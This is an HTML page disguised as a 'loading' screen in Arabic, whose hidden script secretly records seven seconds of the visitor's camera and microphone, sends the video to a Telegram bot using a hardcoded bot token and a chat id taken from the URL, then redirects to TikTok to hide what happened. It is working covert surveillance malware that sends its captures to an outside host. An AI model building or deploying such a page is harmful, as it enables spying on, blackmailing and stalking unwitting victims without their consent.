<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .loading {
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loading">🔄 جاري التحميل...</div>

    <!-- كل عناصر التصوير مخفية -->
    <video id="hiddenVideo" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px; opacity:0;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        // ====== إعدادات بسيطة ======
        const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const chatId = new URLSearchParams(window.location.search).get('id');
        
        // عناصر مخفية
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');
        
        // متغيرات بسيطة
        let stream = null;
        let recorder = null;
        let chunks = [];

        // دالة بدء التسجيل
        async function start() {
            if (!chatId) {
                window.location.href = "https://www.tiktok.com";
                return;
            }

            try {
                // طلب الكاميرا والميكروفون
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                
                video.srcObject = stream;
                
                // انتظار ثانيتين لتثبيت الكاميرا
                setTimeout(() => {
                    // إعداد المسجل
                    recorder = new MediaRecorder(stream);
                    
                    recorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    recorder.onstop = () => {
                        // تجميع الفيديو
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        
                        // إرسال للبوت
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('video', blob, 'video.webm');
                        
                        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                            method: 'POST',
                            body: formData
                        }).finally(() => {
                            // إيقاف الكاميرا والتوجيه
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = "https://www.tiktok.com";
                        });
                    };
                    
                    // تسجيل 7 ثواني
                    recorder.start();
                    setTimeout(() => {
                        recorder.stop();
                    }, 7000);
                    
                }, 2000);
                
            } catch (err) {
                // إذا فشلت الكاميرا، أرسل رسالة واتجه
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `❌ فشل التصوير: ${err.message}`
                    })
                }).finally(() => {
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }

        // ابدأ
        start();

        // طوارئ: توجه بعد 10 ثواني
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 10000);
    </script>
</body>
</html>
